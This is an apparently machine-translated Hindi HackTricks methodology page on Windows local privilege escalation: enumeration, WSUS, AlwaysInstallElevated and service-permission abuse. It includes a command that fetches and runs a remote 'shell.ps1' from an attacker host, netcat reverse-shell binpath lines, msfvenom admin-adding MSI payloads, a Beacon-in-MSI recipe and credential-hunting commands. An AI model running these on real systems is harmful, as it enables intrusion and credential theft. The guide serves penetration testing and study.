# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors देखने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows Theory

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या होते हैं, तो आगे बढ़ने से पहले निम्नलिखित page पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित page देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या होते हैं, तो आगे बढ़ने से पहले निम्नलिखित page पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में ऐसी विभिन्न चीजें हैं जो **आपको system enumerate करने से रोक सकती हैं**, executables run करने से रोक सकती हैं या **आपकी activities को detect कर सकती हैं**। Privilege escalation enumeration शुरू करने से पहले आपको निम्नलिखित **page पढ़ना** चाहिए और इन सभी **defense** **mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के माध्यम से launch किए गए UIAccess processes का दुरुपयोग prompts के बिना High IL तक पहुंचने के लिए किया जा सकता है, जब AppInfo secure-path checks को bypass कर दिया जाए। Dedicated UIAccess/Admin Protection bypass workflow यहां देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

हाल के Windows builds में **SMB arbitrary-port** LPE path भी शामिल किया गया है, जिसमें privileged local NTLM authentication को reused SMB TCP connection पर reflect किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

जांचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी जांचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो Windows environment द्वारा प्रस्तुत **massive attack surface** को दर्शाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson embedded है)_

**System information के साथ locally**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits के Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credential/Juicy info saved है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फाइलें

आप इसे कैसे सक्षम करें, यह [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) पर जान सकते हैं।
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline executions का विवरण रिकॉर्ड किया जाता है, जिसमें चलाए गए commands, command invocations और scripts के कुछ हिस्से शामिल होते हैं। हालांकि, execution का पूरा विवरण और output results संभवतः कैप्चर नहीं किए जा सकते।

इसे enable करने के लिए documentation के "Transcript files" section में दिए गए निर्देशों का पालन करें और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 events देखने के लिए आप execute कर सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Script के execution की पूरी activity और complete content record capture की जाती है, जिससे यह सुनिश्चित होता है कि code के प्रत्येक block को उसके run होने के दौरान document किया जाए। यह process प्रत्येक activity का comprehensive audit trail सुरक्षित रखता है, जो forensics और malicious behavior के analysis के लिए valuable है। Execution के समय सभी activity को document करके process के बारे में detailed insights प्रदान की जाती हैं।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए logging events को Windows Event Viewer में इस path पर देखा जा सकता है: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**।\
अंतिम 20 events देखने के लिए आप इसका उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि updates को http**S** के बजाय http का उपयोग करके request किया जाता है, तो आप system को compromise कर सकते हैं।

आप cmd में निम्नलिखित चलाकर जांच शुरू करते हैं कि network non-SSL WSUS update का उपयोग करता है या नहीं:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी एक जैसा reply मिले:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` है।

तो, **यह exploitable है।** यदि अंतिम registry का मान `0` है, तो WSUS entry को अनदेखा कर दिया जाएगा।

इन vulnerabilities का exploit करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools का उपयोग कर सकते हैं - ये MiTM weaponized exploit scripts हैं, जो non-SSL WSUS traffic में 'fake' updates inject करते हैं।

Research यहाँ पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरी report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)।\
मूल रूप से, यह वही flaw है जिसका यह bug exploit करता है:

> यदि हमारे पास अपने local user proxy को modify करने की शक्ति है, और Windows Updates Internet Explorer की settings में configured proxy का उपयोग करता है, तो हमारे पास अपने asset पर [PyWSUS](https://github.com/GoSecure/pywsus) को locally चलाकर अपने traffic को intercept करने और elevated user के रूप में code चलाने की शक्ति होती है।
>
> इसके अलावा, क्योंकि WSUS service current user की settings का उपयोग करती है, इसलिए यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए self-signed certificate generate करके इस certificate को current user के certificate store में add कर दें, तो हम HTTP और HTTPS दोनों WSUS traffic को intercept कर सकेंगे। WSUS certificate पर trust-on-first-use प्रकार का validation लागू करने के लिए HSTS-जैसे किसी mechanism का उपयोग नहीं करता। यदि प्रस्तुत किया गया certificate user द्वारा trusted है और इसमें सही hostname है, तो service इसे स्वीकार कर लेगी।

आप इस vulnerability को [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool का उपयोग करके exploit कर सकते हैं (एक बार इसके liberated होने पर)।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents localhost IPC surface और एक privileged update channel expose करते हैं। यदि enrollment को attacker server की ओर coerce किया जा सकता है और updater किसी rogue root CA या weak signer checks पर trust करता है, तो local user एक malicious MSI deliver कर सकता है, जिसे SYSTEM service install कर देती है। एक generalized technique (Netskope stAgentSvc chain - CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` **TCP/9401** पर एक localhost service expose करता है, जो attacker-controlled messages को process करती है और **NT AUTHORITY\SYSTEM** के रूप में arbitrary commands चलाने की अनुमति देती है।

- **Recon**: listener और version की पुष्टि करें, जैसे `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`।
- **Exploit**: आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसे PoC को उसी directory में रखें, फिर local socket के माध्यम से SYSTEM payload trigger करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Service कमांड को SYSTEM के रूप में execute करती है।
## KrbRelayUp

Windows **domain** environments में कुछ विशेष conditions के तहत **local privilege escalation** vulnerability मौजूद होती है। इन conditions में ऐसे environments शामिल हैं जहाँ **LDAP signing enforced नहीं है,** users के पास **Resource-Based Constrained Delegation (RBCD)** configure करने के लिए self-rights हैं, और users के पास domain के भीतर computers create करने की capability है। यह ध्यान रखना महत्वपूर्ण है कि ये **requirements** **default settings** के साथ पूरी होती हैं।

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) में **exploit** खोजें।

Attack के flow के बारे में अधिक जानकारी के लिए [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) देखें।

## AlwaysInstallElevated

**यदि** ये 2 registry entries **enabled** हैं (value **0x1** है), तो किसी भी privilege वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास meterpreter session है, तो आप module **`exploit/windows/local/always_install_elevated`** का उपयोग करके इस technique को automate कर सकते हैं।

### PowerUP

Power-up से `Write-UserAddMSI` command का उपयोग करके current directory के अंदर privileges escalate करने के लिए एक Windows MSI binary बनाएं। यह script एक precompiled MSI installer लिखती है, जो user/group addition के लिए prompt दिखाता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बनाई गई binary को privileges escalate करने के लिए execute करें।

### MSI Wrapper

इस tools का उपयोग करके MSI wrapper बनाने का तरीका सीखने के लिए यह tutorial पढ़ें। ध्यान दें कि यदि आप केवल **command lines** को **execute** करना चाहते हैं, तो आप "**.bat**" file को wrap कर सकते हैं।


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike या Metasploit से `C:\privesc\beacon.exe` में एक **new Windows EXE TCP payload** **Generate** करें।
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" type करें। **Setup Wizard** project चुनें और **Next** पर click करें।
- Project को कोई नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें और **Create** पर click करें।
- जब तक आप step 3 of 4 (include करने वाली files चुनें) तक न पहुंचें, तब तक **Next** पर click करते रहें। **Add** पर click करें और अभी generate किया गया Beacon payload चुनें। फिर **Finish** पर click करें।
- **Solution Explorer** में **AlwaysPrivesc** project को highlight करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक legitimate दिखाई दे सकता है।
- Project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर click करें। इससे यह सुनिश्चित होगा कि installer run होते ही beacon payload execute हो जाए।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, इसे **build** करें।
- यदि warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर set किया है।

### MSI Installation

malicious `.msi` file की **installation** को **background** में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability का exploit करने के लिए आप इसका उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus और Detectors

### Audit Settings

ये settings तय करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logs कहाँ भेजे जाते हैं, यह जानना महत्वपूर्ण है
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** को **स्थानीय Administrator passwords के management** के लिए डिज़ाइन किया गया है, जिससे यह सुनिश्चित होता है कि domain से जुड़े कंप्यूटरों पर प्रत्येक password **unique, randomised और नियमित रूप से updated** हो। ये passwords Active Directory में सुरक्षित रूप से stored होते हैं और केवल उन users द्वारा access किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions दी गई हों, जिससे वे authorized होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि active हो, तो **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में stored होते हैं।\
[**इस page पर WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest)।
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू करके, Microsoft ने Local Security Authority (LSA) के लिए enhanced protection शुरू की, ताकि untrusted processes को **उसकी memory पढ़ने** या code inject करने के प्रयासों को **block** किया जा सके और system को अधिक सुरक्षित बनाया जा सके।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection)।
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य किसी device पर stored credentials को pass-the-hash attacks जैसे threats से सुरक्षित रखना है।| [**Credentials Guard के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) authenticate करता है और operating system components उनका उपयोग करते हैं। जब किसी user का logon data किसी registered security package द्वारा authenticated होता है, तो आमतौर पर उस user के लिए domain credentials स्थापित हो जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहां**](../stealing-credentials/credentials-protections.md#cached-credentials)।
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Users & Groups की Enumeration

आपको यह जांचना चाहिए कि जिन groups के आप सदस्य हैं, उनमें से किसी के पास interesting permissions तो नहीं हैं.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

यदि आप **किसी privileged group के सदस्य हैं, तो आप privileges escalate करने में सक्षम हो सकते हैं**। Privileged groups और privileges escalate करने के लिए उनका abuse करने के तरीके के बारे में यहां जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

इस पेज पर **token** के बारे में **और जानें**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)।\
**Interesting tokens** के बारे में जानने और उनका abuse करने के लिए निम्नलिखित पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रही प्रक्रियाएं

### फ़ाइल और फ़ोल्डर अनुमतियां

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की command line में passwords की जांच करें**।\
जांचें कि क्या आप **चल रहे किसी binary को overwrite** कर सकते हैं या संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का शोषण करने के लिए binary folder पर आपके पास write permissions हैं:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** चल रहे हैं या नहीं, इसकी जाँच करें; privileges escalate करने के लिए उनका abuse किया जा सकता है](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)।

**Processes की binaries की permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**processes की binaries वाले folders की permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके running process का memory dump बना सकते हैं। FTP जैसी services के **credentials in clear text in memory** होते हैं; memory dump करके credentials पढ़ने का प्रयास करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI apps

**SYSTEM के रूप में चलने वाले Applications किसी user को CMD शुरू करने या directories browse करने की अनुमति दे सकते हैं।**

Example: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर click करें

## Services

Service Triggers कुछ conditions होने पर Windows को service शुरू करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर उनके triggers को fire करके privileged services शुरू कर सकते हैं। Enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services की list प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

किसी service की जानकारी प्राप्त करने के लिए आप **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
प्रत्येक service के लिए आवश्यक privilege level जांचने हेतु _Sysinternals_ से binary **accesschk** रखना recommended है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह जाँचने की अनुशंसा की जाती है कि क्या "Authenticated Users" किसी service को modify कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप XP के लिए accesschk.exe यहाँ से download कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### service enable करें

यदि आपको यह error मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 उत्पन्न हुआ है।_\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे enable कर सकते हैं using
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि service upnphost के काम करने के लिए SSDPSRV पर निर्भर करता है (XP SP1 के लिए)**

**इस समस्या का एक अन्य workaround** चलाना है:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

उस स्थिति में जब "Authenticated users" group के पास किसी service पर **SERVICE_ALL_ACCESS** हो, तो service की executable binary को modify करना संभव है। **sc** को modify और execute करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनः प्रारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
विभिन्न permissions के माध्यम से privileges escalate किए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: permissions को reconfigure करने में सक्षम बनाता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership प्राप्त करने और permissions को reconfigure करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता inherit करता है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी inherit करता है।

इस vulnerability की detection और exploitation के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries की कमजोर permissions

यदि कोई service **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, या किसी privileged domain account के रूप में चलती है, लेकिन **low-privileged users service EXE या उसके parent folder को modify कर सकते हैं**, तो अक्सर **binary को replace करके और service को restart करके** service को hijack किया जा सकता है।

**जाँचें कि क्या आप service द्वारा execute की जाने वाली binary को modify कर सकते हैं** या उस **folder पर write permissions रखते हैं** जहाँ binary स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**।**\
आप किसी service द्वारा execute की जाने वाली प्रत्येक binary को **wmic** का उपयोग करके प्राप्त कर सकते हैं (system32 में नहीं) और **icacls** का उपयोग करके अपनी permissions जाँच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`**, या **`Authenticated Users`** को दिए गए खतरनाक ACLs देखें, विशेष रूप से service executable या उसे रखने वाली directory पर **`(F)`**, **`(M)`**, या **`(W)`**। एक practical abuse flow इस प्रकार है:

1. `sc qc <service_name>` से service account और executable path की पुष्टि करें।
2. `icacls <path>` से पुष्टि करें कि binary writable है।
3. Service binary को payload या किसी valid malicious service binary से replace करें।
4. `sc stop <service_name> && sc start <service_name>` से service restart करें (या reboot / service trigger की प्रतीक्षा करें)।

उपयोगी automated checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> यदि service किसी सामान्य user को इसे restart करने की अनुमति नहीं देती है, तो जांचें कि क्या यह boot पर automatically start होती है, इसमें कोई failure action है जो इसे फिर से launch करता है, या इसे इस्तेमाल करने वाला application इसे indirectly trigger कर सकता है।

### Service registry modify permissions

आपको जांचना चाहिए कि क्या आप किसी service registry को modify कर सकते हैं।\
आप यह करके किसी service **registry** पर अपनी **permissions** **check** कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जाँचा जाना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। यदि ऐसा है, तो service द्वारा execute किए जाने वाले binary को बदला जा सकता है।

service द्वारा execute किए जाने वाले binary का Path बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

कुछ Windows Accessibility features प्रति-user **ATConfig** keys बनाते हैं, जिन्हें बाद में एक **SYSTEM** process द्वारा HKLM session key में कॉपी किया जाता है। एक registry **symbolic link race** उस privileged write को **किसी भी HKLM path** पर redirect कर सकती है, जिससे arbitrary HKLM **value write** primitive मिलता है।

मुख्य locations (उदाहरण: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` installed accessibility features की सूची रखता है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` user-controlled configuration store करता है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाया जाता है और user द्वारा writable होता है।

Abuse flow (CVE-2026-24291 / ATConfig):

